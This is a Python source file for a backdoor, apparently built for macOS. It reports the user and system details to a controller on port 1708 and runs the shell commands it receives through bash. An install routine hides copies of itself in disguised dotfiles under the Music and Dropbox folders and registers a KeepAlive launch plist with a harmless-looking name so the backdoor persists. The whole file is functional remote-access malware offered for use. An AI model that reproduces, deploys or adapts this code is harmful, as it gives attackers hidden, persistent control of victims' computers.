#!/usr/bin/env python

import socket
import subprocess
import sys
import os
import shutil
import time
import json
import threading

try:
    from StringIO import StringIO
except ImportError:
    from io import StringIO

HOST = 'localhost'
PORT = 1708

class ByteLock:
    def __init__(self):
        self.bytes = b''
        self.bytelock = threading.Lock()

    def write(self,bytes):
        with self.bytelock:
            self.bytes += bytes

    def getAndClear(self):
        with self.bytelock:
            temp = self.bytes
            self.bytes = b''
            return temp

def main():
    while True:
        if hasInternetConnection():
            try:
                # Get and send info
                user, arch = getInfo()

                infodict = dict(user=user,arch=arch)
                json_dict = json.dumps(infodict)

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((HOST, PORT))
                s.sendall(json_dict.encode('UTF-8'))
                serve(s)
            except Exception as e:
                # DEBUG
                raise e
        # Try again in a minute
        time.sleep(60)

def serve(sock):
    bytelock = ByteLock()
    proc = subprocess.Popen(["bash"],
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=sock.makefile('wb'))

    # Get commands from server, parse and send appropriate to proc
    def pollProc():
        while True:
            out = proc.stdout.read(1)
            if out == '' and proc.poll() is not None:
                break
            if out != '':
                bytelock.write(out)
    def pollSock():
        for line in readSocket(sock):
            proc.stdin.write(line.encode('UTF-8'))

    pollSock()



def readSocket(sock,endchars='\n'):
    buff = b""
    while True:
        packet = sock.recv(1024)
        if len(packet)==0:
            raise Exception("Server closed socket")
        buff += packet
        try:
            buffstr = buff.decode('UTF-8')
            if endchars in buffstr:
                line, buffstr = buffstr.split(endchars, 1)
                buff = buffstr.encode('UTF-8')
                yield line
        except Exception as e:
            print("Exception: "+e)

def getInfo():
    proc = subprocess.Popen(["whoami"], stdout=subprocess.PIPE)
    (user, err) = proc.communicate()

    proc = subprocess.Popen(["uname","-a"], stdout=subprocess.PIPE)
    (arch, err) = proc.communicate()

    return user.decode('UTF-8'), arch.decode('UTF-8')


def hasInternetConnection():
    try:
        socket.getaddrinfo("google.com", 80)
        return True
    except:
        return False


###
#
# All the install scripts are below
#
###

STARTUP_PLIST = ('<?xml version="1.0" encoding="UTF-8"?>' + '\n'
                 '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
                 '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">' + '\n'
                 '<plist version="1.0">' + '\n'
                 '<dict>' + '\n'
                 '\t' + '<key>Label</key>' + '\n'
                 '\t' + '<string>pythondaemon</string>' + '\n'
                 '\t' + '<key>ProgramArguments</key>' + '\n'
                 '\t' + '<array>' + '\n'
                 '\t\t' + '<string>{python_path}</string>' + '\n'
                 '\t\t' + '<string>{script_path}</string>' + '\n'
                 '\t' + '</array>' + '\n'
                 '\t' + '<key>StandardErrorPath</key>' + '\n'
                 '\t' + '<string>/var/log/python_script.error</string>' + '\n'
                 '\t' + '<key>KeepAlive</key>' + '\n'
                 '\t' + '<true/>' + '\n'
                 '</dict>' + '\n'
                 '</plist>' + '\n')

STARTUP_LOCS = ['/System/Library/LaunchAgents',
                '/System/Library/LaunchDaemons',
                '~/Library/LaunchAgents']
DAEMON_NAME = 'library_launcher.plist'

SCRIPT_LOCS = ['~/Music/iTunes/.library.py','~/.dropbox/.index.py']

INSTALL_FLAG = '-install'

def install():
    # Find python
    proc = subprocess.Popen(["which", "python"], stdout=subprocess.PIPE)
    (out, err) = proc.communicate()
    if err is not None:
        return False
    python_path = out.strip()

    # First find a location for the script
    script_path = None
    for loc in SCRIPT_LOCS:
        script_path = os.path.expanduser(loc)
        if not os.path.exists(script_path):
            try:
                shutil.copy(os.path.abspath(__file__),script_path)
                break
            except:
                pass
    if script_path is None:
        return False

    # Now we have hidden the script
    daemon_loc = None
    for loc in STARTUP_LOCS:
        daemon_loc = os.path.join(os.path.expanduser(loc),DAEMON_NAME)
        if not os.path.exists(daemon_loc):
            try:
                with open(daemon_loc,"w") as f:
                    f.write(STARTUP_PLIST.format(python_path=python_path,script_path=script_path))
                break
            except:
                pass
    if daemon_loc is not None:
        print("Wrote to: {0} {1}".format(script_path, daemon_loc))
        return True


if __name__ == "__main__":
    if INSTALL_FLAG in sys.argv:
        install()
    else:
        main()